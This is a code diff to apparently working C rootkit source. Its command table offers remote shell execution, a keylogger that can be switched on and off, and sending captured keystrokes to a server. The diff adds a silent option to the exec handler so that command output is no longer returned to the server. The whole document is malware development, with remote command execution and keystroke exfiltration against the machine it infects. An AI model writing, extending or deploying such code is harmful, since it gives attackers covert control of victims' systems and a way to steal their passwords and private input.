@@ -33,7 +33,7 @@ int help_handler(char *args);
 int rootkit_command(char *command, unsigned command_size);
 
 static struct command rootkit_commands_array[] = {
-	{ "exec", 4, "execute a shell command. Usage : exec [args*]", 20, exec_handler },
+	{ "exec", 4, "execute a shell command. Usage : exec [-s for silent mode] [args*]", 20, exec_handler },
 	{ "klgon", 6, "activate keylogger", 20, klgon_handler },
 	{ "klgoff", 7, "deactivate keylogger", 21, klgoff_handler },
 	{ "klg", 3, "send keylogger content to server", 35, klg_handler },
@@ -91,24 +91,35 @@ int rootkit_command(char *command, unsigned command_size) {
 }
 
 int exec_handler(char *args) {
+	bool catch_stds = true;
+
+	// if first non whitespace character is '-s', set catch_stds to false
+	args += strspn(args, " \t");
+	if (strncmp(args, "-s ", 3) == 0) {
+		catch_stds = false;
+		args += 3; // Skip the '-s ' part
+	}
+
 	// Extract the command from the received message
 	char *command = args;
 	command[strcspn(command, "\n")] = '\0';
 	DBG_MSG("exec_handler: executing command: %s\n", command);
 
 	// Execute the command
-	int ret_code = exec_str_as_command(command);
+	int ret_code = exec_str_as_command(command, catch_stds);
 	if (ret_code < 0) {
 		ERR_MSG("exec_handler: failed to execute command\n");
 		return ret_code;
 	}
 
-	// Send the result to the server
-	send_to_server("stdout:\n");
-	send_file_to_server(STDOUT_FILE);
-	send_to_server("stderr:\n");
-	send_file_to_server(STDERR_FILE);
-	send_to_server("terminated with code %d\n", exec_result.code);
+	if(catch_stds) {
+		// Send the command output to the server
+		send_to_server("stdout:\n");
+		send_file_to_server(STDOUT_FILE);
+		send_to_server("stderr:\n");
+		send_file_to_server(STDERR_FILE);
+		send_to_server("terminated with code %d\n", exec_result.code);
+	}
 
 	return ret_code;
 }
